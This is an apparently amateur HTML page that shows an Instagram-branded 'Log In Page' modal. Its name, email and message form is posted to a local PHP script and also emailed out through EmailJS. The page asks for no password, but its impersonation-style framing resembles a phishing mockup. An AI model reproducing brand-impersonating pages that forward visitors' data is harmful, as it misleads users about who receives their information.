<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">





    <title>Send Database</title>
 <style>

  body {
    background-color: #f4f6f9;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .modal-content{
    background-color:rgb(255, 255, 255);
  }

  .modal-header{
    background-color: #0d6efd;
    color: white;
     
  }

  .modal-button{
    text-align: center;
    background: none;
    justify-content: center;
    display: flex;
    flex-wrap: wrap;
    align-items: center;
   
    
  
}
.btn_11{
    width: 90%;
    height: 40%;
    font-size: 1.375rem;
    border: none;
    color: white;
    margin: .8125rem;
    background-color: #0d6efd; 
}

  .modal-body {
    padding: 1.875rem;
    font-size: 1.5625rem;
    color: #333;
    
  }

  .modal-body button{
    width: 100%;
    border: none;
    background-color: #0d6efd;
    color: white;
  }

  .modal-body textarea{
    width: 100%;
    height: 30%;
    padding: .9375rem;
    font-family: capitalize;
    margin-bottom: .9375rem;
    border-radius: .3125rem;
    font-size: 1.5625rem;
    border: .0625rem solid grey;
  }

  .modal-body input{
    width: 100%;
    height: 30%;
    padding: .9375rem;
    font-family: capitalize;
    margin-bottom: .9375rem;
    border-radius: .3125rem;
    border: .0625rem solid grey;
 }

 .write{
  text-align: center;
  
 }
.right{
  width: 100%;
  text-decoration: none;
  color: black;
  margin: .9375rem;
  font-size: 1.375rem;
  margin-bottom: 1.875rem;
  border: none;
  font-family: capitalize;
 }

 .heading{
  width: auto;
  background: none;
 }

 .heading .imgs_x{
   padding-top: 1.25rem;
   width: 18.75rem;
   height: 10rem;
   padding-left: 10rem;
  
 }
 
 .heading strong{
  font-weight: 700;
  font-size: 2.375rem;
  padding-top: .625rem;
  padding-left: 9.6875rem;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  font-style: italic;
 }


</style> 
</head>

<body>


    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5>Log In Page</h5>
                </div>

                

                <div class="heading">
                    <strong>Instagram</strong>
                    <img class="imgs_x" src="./in.png" alt="image2">
                </div>

               

                <div class="modal-body">
                
               <form id="contact-form" action="emai_submit.php" method="POST">


                 <input type="text" name="name" placeholder="Your Name" required />
                 <input type="email" name="email" placeholder="Your Email" required />
                 <textarea name="message" placeholder="Your Message" required></textarea>
                 <button type="submit">Submit</button>
                 </form>
                  </div>


                 <div class="modal-button">
                    <button class="btn_11">Log In</button>
                    <button class="btn_11">Forget Password</button>
                 </div>


                <div class="write">
                    <a href="#" class="right">Create New Account ??</a>
                </div>
                

                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary">Save changes</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>


    <script>

    window.onload = function(){
      if (performance.navigation.type) {  
        setTimeout(function(){
          var myModal = new bootstrap.Modal(document.getElementById('exampleModal'));
          myModal.show(); 
        }, 1000);
      }
    }
    
</script>

  <script>
    $(document).ready(function() {
        
        $('#contact-form').on('submit', function(e) {
            e.preventDefault();  

            var formData = $(this).serialize();

            // AJAX request
            $.ajax({
                url: 'conn.php', 
                type: 'POST',
                data: formData,
                success: function(response) {
                    // Show the server response (for example, a success message)
                    alert(response); 
                    $('#contact-form')[0].reset();

                },
                error: function() {
                    alert('There was an error submitting the form.');
                }
            });
        });
    });
</script>


    <script>
      (function () {
        emailjs.init("xYF_Gl4XhP1_msFkA");
      })();

       const form = document.getElementById("contact-form");
       form.addEventListener("submit", function (event) {
        event.preventDefault();

        emailjs
          .sendForm("service_c3lu2zq", "template_96ukfed", form)
          .then(function (response) {
            alert("Email sent successfully!");

            form.reset();

          })
          .catch(function (error) {
            alert("Failed to send email: " + error.text);
          });
      });
    </script>


</body>

</html>  
